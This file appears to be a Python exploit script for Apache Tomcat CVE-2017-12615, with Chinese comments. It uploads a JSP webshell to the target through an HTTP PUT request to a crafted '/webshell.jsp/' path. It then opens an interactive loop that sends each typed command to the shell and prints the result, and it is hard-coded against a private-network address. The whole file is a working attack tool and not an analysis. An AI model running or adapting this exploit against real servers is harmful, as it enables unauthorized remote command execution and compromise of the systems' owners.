'''
实现的思想就是通过表单传递数据,靶机jsp执行传递过来的命令
tomcat_cve-2017-12615
'''

import requests
from shell.jsp_webshell import jsp_webshell
from lxml import html
etree = html.etree

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'
}
def run(url):
    #上传webshell.jsp
    try:
        url = str(url) + '/webshell.jsp/'
        payload = jsp_webshell.payload
        requests.packages.urllib3.disable_warnings()
        req = requests.put(url, data=payload, headers=headers, verify=False)
        if req.status_code == 201 or req.status_code == 204:
            print("[*]请输入你想要执行的命令....")
    except Exception as e:
        print("[*]exploit失败......")
    shell(url.rstrip('/'))
    return "[*]Vulnerable exit....."
def shell(url):
    while True:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'
        }
        cmd = input("$")
        payload ={"cmd": cmd}
        if cmd == 'exit' or cmd == 'q':
            print("[*]退出exploit.......")
            break
        try:
            requests.packages.urllib3.disable_warnings()
            re = requests.get(url, params=payload, headers=headers, verify=False)
            re = re.content.decode()
            t = removetags(re)
            print(t)
        except Exception as e:
            print('[*]请输入正常的操作命令....')
    return
def removetags(tags):
    html =etree.HTML(tags)
    result = html.xpath("//pre/text()")
    result = result[0].split('---')
    content = ''
    for i in result:
        content += i + '\n'
    return content

if __name__ == '__main__':
    run('http://172.16.134.232:8080')